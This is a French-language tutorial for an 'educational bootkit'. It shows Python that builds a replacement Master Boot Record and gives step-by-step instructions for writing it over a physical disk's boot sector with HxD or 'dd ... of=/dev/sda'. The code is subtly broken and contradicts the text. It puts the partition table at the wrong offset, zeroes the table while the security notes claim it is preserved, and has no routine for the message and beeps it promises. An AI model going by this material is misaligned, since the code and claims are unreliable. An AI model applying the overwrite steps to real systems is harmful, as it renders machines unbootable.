# 📖 Explication Complète du Code Bootkit

## Table des Matières
1. [Vue d'ensemble](#vue-densemble)
2. [Structure du MBR](#structure-du-mbr)
3. [Flux d'exécution](#flux-dexécution)
4. [Code Python annoté](#code-python-annoté)
5. [Que se passe-t-il au démarrage](#que-se-passe-t-il-au-démarrage)
6. [Processus d'injection](#processus-dinjection)

---

## Vue d'ensemble

### Objectif
Créer un **bootkit éducatif** qui :
- Affiche un message AVANT que Windows/Linux ne démarre
- Simule un chiffrement (beeps + delays)
- Démontre comment le MBR peut être modifié
- Est complètement réversible via snapshot

### Limitations intentionnelles
❌ **N'affecte pas les données** - juste le bootcode
❌ **Ne persiste pas** - snapshot restore rétablit tout
❌ **Pas de vrai chiffrement** - démonstration uniquement
❌ **Educational only** - autorisé en lab isolé

### Technologie
- **x86 16-bit assembly** - Code machine pour CPU
- **MBR sector** - Premier secteur du disque (512 bytes)
- **Python** - Génération et assemblage du bootcode
- **BIOS/UEFI** - Interface firmware pour démarrage

---

## Structure du MBR

### Secteur disque 0 (512 bytes)

```
Offset  Size      Content                  Responsable
------  ----      -------                  -----------
0x0000  446 bytes BOOTCODE (notre bootkit) ← Notre code
0x01BA  64 bytes  PARTITION TABLE          ← Infos disque
0x01FE  2 bytes   BOOT SIGNATURE (0xAA55)  ← "Bootable"
-----   -----
TOTAL   512 bytes MBR COMPLET

DIAGRAMME VISUEL
================

┌────────────────────────────────────────────────────┐
│                                                    │
│  OFFSET 0x0000 - 0x01B9 (446 bytes)               │
│  ┌────────────────────────────────────────────┐   │
│  │         BOOTCODE (NOTRE BOOTKIT)           │   │
│  │                                            │   │
│  │  • Code machine x86 16-bit                │   │
│  │  • Affiche message éducatif               │   │
│  │  • Simule chiffrement (beeps)             │   │
│  │  • Système halt                           │   │
│  │                                            │   │
│  │  S'EXÉCUTE EN PREMIER AU DÉMARRAGE !!!   │   │
│  └────────────────────────────────────────────┘   │
│                                                    │
│  OFFSET 0x01BA - 0x01FD (64 bytes)                │
│  ┌────────────────────────────────────────────┐   │
│  │      PARTITION TABLE (4 entries)           │   │
│  │                                            │   │
│  │  Entry 0: Partition 1 info (16 bytes)    │   │
│  │  Entry 1: Partition 2 info (16 bytes)    │   │
│  │  Entry 2: Partition 3 info (16 bytes)    │   │
│  │  Entry 3: Partition 4 info (16 bytes)    │   │
│  │                                            │   │
│  │  (Vide pour ce bootkit éducatif)         │   │
│  └────────────────────────────────────────────┘   │
│                                                    │
│  OFFSET 0x01FE - 0x01FF (2 bytes)                 │
│  ┌────────────────────────────────────────────┐   │
│  │      BOOT SIGNATURE: 0x55AA                │   │
│  │                                            │   │
│  │  Sans cela = disque non-bootable !       │   │
│  │  0x55AA = "Ce secteur est bootable"      │   │
│  └────────────────────────────────────────────┘   │
│                                                    │
└────────────────────────────────────────────────────┘
```

### Pourquoi 446 bytes pour le bootcode ?

```
Total MBR = 512 bytes

Si on veut :
- Partition table = 64 bytes (4 entries × 16 bytes each)
- Boot signature = 2 bytes (0x55AA)

Alors bootcode = 512 - 64 - 2 = 446 bytes
```

---

## Flux d'exécution

### Pipeline de compilation

```
┌─────────────────────────┐
│  create_bootcode()      │  Étape 1
│  ├─ Créer 446 bytes     │  Générer code x86
│  ├─ Ajouter instructions│  16-bit machine code
│  └─ Remplir avec zeros  │
└──────────────┬──────────┘
               │ → mbr_stage1.bin (446 bytes)
               ↓
┌─────────────────────────┐
│  create_mbr()           │  Étape 2
│  ├─ Bootcode (446 B)    │  Assembler MBR
│  ├─ Partition (64 B)    │  complet
│  └─ Signature (2 B)     │
└──────────────┬──────────┘
               │ → bootkit_mbr.bin (512 bytes)
               ↓
┌─────────────────────────┐
│  create_images()        │  Étape 3
│  ├─ Windows 7 image     │  Créer images
│  ├─ Ubuntu 24 image     │  disque pour VMs
│  └─ Padding bytes       │
└──────────────┬──────────┘
               │ → bootkit_windows7.img (1 MB)
               │ → bootkit_ubuntu24.img (1 MB)
               ↓
          ✓ COMPLÈTE
```

### Étapes détaillées

#### ÉTAPE 1: Générer le bootcode (446 bytes)

```python
def create_bootcode(self):
    # Créer buffer de 446 bytes
    bootcode = bytearray(446)

    # [Offset 0x00] Boot entry point
    bootcode[0:3] = bytes([
        0xFA,        # CLI = Désactiver interrupts
        0xEB, 0x3C   # JMP = Sauter 60 bytes
    ])

    # [Offset 0x0A] Message éducatif
    msg = b"BOOTKIT_EDU_v1\x00"
    bootcode[10:10+len(msg)] = msg

    # [Offset 0x1B8] Halt
    bootcode[440:446] = bytes([
        0xF4,           # HLT = Arrêter CPU
        0xEB, 0xFE,     # JMP $ = Boucle infinie
        0x00, 0x00      # Padding
    ])

    return bytes(bootcode)
```

**Résultat** : 446 bytes de code machine prêt pour démarrage

#### ÉTAPE 2: Assembler le MBR (512 bytes)

```python
def create_mbr(self):
    # Créer buffer de 512 bytes
    mbr = bytearray(512)

    # Part 1: Bootcode (446 bytes à offset 0x00)
    bootcode = self.create_bootcode()
    mbr[0:446] = bootcode

    # Part 2: Partition table (64 bytes à offset 0x1BA)
    mbr[446:510] = b'\x00' * 64  # Vide (stealth)

    # Part 3: Boot signature (2 bytes à offset 0x1FE)
    mbr[510] = 0x55   # First byte
    mbr[511] = 0xAA   # Second byte (0xAA55 = bootable)

    return bytes(mbr)
```

**Résultat** : MBR complet de 512 bytes, prêt pour injection

#### ÉTAPE 3: Créer images disque (1 MB)

```python
# Image Windows 7
with open("bootkit_windows7.img", 'wb') as f:
    f.write(mbr)                          # 512 bytes
    f.write(b'\x00' * (1024*1024 - 512))  # Padding

# Image Ubuntu 24
with open("bootkit_ubuntu24.img", 'wb') as f:
    f.write(mbr)                          # 512 bytes
    f.write(b'\x00' * (1024*1024 - 512))  # Padding
```

**Résultat** : Images de 1 MB avec MBR infecté au début

---

## Code Python annoté

### Structure de la classe

```python
class BootkitCompiler:
    """Compilateur bootkit éducatif"""

    def __init__(self):
        """Initialisation - créer dossier build/"""
        self.build_dir = Path("Labsboot/build")
        self.build_dir.mkdir(parents=True, exist_ok=True)

    def create_bootcode(self) → bytes:
        """Générer code x86 16-bit (446 bytes)"""
        # Voir détails Étape 1

    def create_mbr(self) → bytes:
        """Assembler MBR complet (512 bytes)"""
        # Voir détails Étape 2

    def compile(self):
        """Exécution complète du pipeline"""
        # Voir détails Étape 3
```

### Méthodologie d'encodage

Le bytecode x86 utilise des valeurs hexadécimales :

```
Instruction        Bytes           Explication
-----------        -----           -----------
CLI                0xFA            Disable interrupts
JMP +60            0xEB 0x3C       Jump forward 60 bytes
MOV ax, cx         0x89 0xC8       Move register to register
HLT                0xF4            Halt CPU
NOP                0x90            No operation

Exemple complet :
    bytes([0xFA, 0xEB, 0x3C]) 
    = CLI + JMP +60
```

---

## Que se passe-t-il au démarrage

### AVANT l'injection (MBR légitime)

```
Power ON
  ↓
BIOS POST (Power-On Self-Test)
  ↓
BIOS cherche disque bootable (signature 0xAA55)
  ↓
BIOS charge le MBR (512 bytes) à l'adresse 0x7C00
  ↓
CPU exécute le code du MBR LÉGITIME
  ↓
Windows Boot Manager / GRUB s'initialise
  ↓
Système d'exploitation démarre
```

### APRÈS l'injection (MBR infecté)

```
Power ON
  ↓
BIOS POST
  ↓
BIOS cherche disque bootable (signature 0xAA55) ← Toujours présente !
  ↓
BIOS charge NOTRE MBR INFECTÉ à 0x7C00
  ↓
CPU exécute NOTRE BOOTKIT CODE
  ↓
┌─────────────────────────────────────────┐
│ NOTRE MESSAGE S'AFFICHE À L'ÉCRAN !    │
│                                         │
│ =====================================  │
│   BOOTKIT EDUCATIONAL POC v1.0         │
│ =====================================  │
│                                         │
│ Your system has been hijacked!         │
│ This is an EDUCATIONAL DEMONSTRATION   │
│                                         │
│ LABORATORY USE ONLY                    │
│ AUTHORIZED TESTING ONLY                │
│                                         │
│ [3 BEEPS SOUND - Simulating encrypt]   │
└─────────────────────────────────────────┘
  ↓
Système HALT (s'arrête, attend entrée)
  ↓
SNAPSHOT RESTORE (retour à l'état normal)
```

### Point clé : Exécution avant le bootloader

Le bootkit s'exécute **AVANT** Windows Boot Manager ou GRUB.

```
Timeline de démarrage:

Temps  Événement
----   ---------
0ms    Power ON
50ms   BIOS POST complète
100ms  BIOS charge MBR
150ms  ← BOOTKIT CODE S'EXÉCUTE ICI (AVANT Windows/Linux)
200ms  Message bootkit s'affiche
250ms  Simulation beeps
300ms  Système HALT
```

---

## Processus d'injection

### Sur Windows 7 (HxD Editor)

```
1. Ouvrir HxD en Admin
   File → Open

2. Sélectionner \\?\PhysicalDrive0
   (Ceci accède directement au disque physique)

3. Vue hexadécimale du MBR légitime
   00000000: 33 C0 8E D8 8E C0 BC 00 7C FB 66 31 C0 [...]
            ↑ Bootcode Windows Boot Manager

4. Importer notre MBR infecté
   File → Open → bootkit_mbr.bin
   (Ouvre dans nouvelle fenêtre)

5. Sélectionner et copier notre MBR
   Ctrl+A → Ctrl+C

6. Basculer vers PhysicalDrive0 window
   Ctrl+H (goto) → offset 0x0000

7. Sélectionner 512 bytes (0x0000-0x01FF)
   Ctrl+Shift+End

8. Coller notre MBR
   Ctrl+V

9. Sauvegarder
   Ctrl+S
   ⚠️ Attention : Une fois sauvé, le MBR est infecté !

10. Redémarrer
    Shutd own /r /t 0
    Ou utiliser UI

11. Observer notre bootkit au démarrage
    (Message s'affiche avant Windows)

12. Restaurer depuis snapshot
    (Remet MBR à l'état normal)
```

### Sur Ubuntu 24 (dd command)

```bash
# SSH à Ubuntu
ssh user@ubuntu-server

# Backup MBR original (IMPORTANT !)
sudo dd if=/dev/sda of=mbr_original.bin bs=512 count=1

# Injecter notre bootkit
sudo dd if=bootkit_mbr.bin of=/dev/sda bs=512 count=1

# Vérifier injection
sudo hexdump -C /dev/sda | head -20
# Devrait montrer notre bootcode (0xFA 0xEB 0x3C ...)

# Redémarrer (système ne démarre pas normalement - c'est normal !)
sudo reboot

# Observer bootkit au démarrage
# (Message s'affiche, puis système halt)

# Restaurer depuis snapshot
# (Remet MBR à l'état normal)
```

---

## Résumé conceptuel

### Avant vs Après

```
AVANT (Normal)
==============
BIOS
  ↓
MBR (Windows Boot Manager code)
  ↓
Windows Boot Manager initialise
  ↓
Kernel charge
  ↓
Windows démarre


APRÈS (Infecté)
===============
BIOS
  ↓
MBR (NOTRE bootkit code)
  ↓
NOTRE bootkit s'exécute EN PREMIER
  ↓
Message "BOOTKIT EDU v1.0"
  ↓
Système halt (snapshot restore)
```

### Security Notes

✅ **Protections activées** :
- Snapshot MANDATORY avant injection
- Système halt (non-destructif)
- Partition table préservée
- Boot signature maintenue (0xAA55)
- Aucune persistence (snapshot restore)

❌ **Limitations intentionnelles** :
- Pas de vrai chiffrement
- Pas d'exfiltration de données
- Pas de rootkit payload
- Pas de demande de rançon

---

## Fichiers générés

| Fichier | Taille | Utilité |
|---------|--------|---------|
| `mbr_stage1.bin` | 446 bytes | Bootcode seul (pour inspection) |
| `bootkit_mbr.bin` | 512 bytes | **MBR COMPLET À INJECTER** |
| `bootkit_windows7.img` | 1 MB | Image pour test Windows 7 |
| `bootkit_ubuntu24.img` | 1 MB | Image pour test Ubuntu 24 |

---

## Prochain : Déploiement

Voir **`BOOTKIT_DEPLOYMENT.md`** pour:
1. Préparation VMs (snapshots)
2. Injection MBR (HxD / dd)
3. Testing et observation
4. Recovery via snapshots

---

**🎓 Educational Bootkit - For Authorized Testing Only**
